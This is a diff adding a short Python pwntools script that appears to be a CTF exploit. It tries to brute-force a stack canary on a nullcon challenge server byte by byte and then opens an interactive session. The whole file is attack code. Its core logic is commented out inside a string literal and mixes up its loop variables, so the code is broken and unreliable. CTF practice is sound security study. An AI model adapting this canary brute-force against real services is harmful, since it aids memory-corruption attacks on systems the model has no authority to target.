@@ -1,0 +1,30 @@
+from pwn import *
+#io=process("./main",env={"LD_PRELOAD":"./libc.so.6"})
+#gdb.attach(io)
+
+can=""
+for i in range(8):
+    j=0
+    while True:
+        try:
+            io=remote("pwn3.ctf.nullcon.net",1234)
+        except:
+            print "Sever Unreachable"
+            continue
+        io.recvline()
+        """
+        pay="A"*20+can+p8(i)
+        string="aa"
+        if(io.canrecv()):
+            string=io.recv()
+        if(string[0]=='S'):
+            print "Nope"
+            pass
+        else:
+            can=can+p8(i)
+            print "canary found at %s is %s"%(i,hex(p8(j)))
+            break
+        j=j+1
+print "Entire canary is "+can
+"""
+io.interactive()
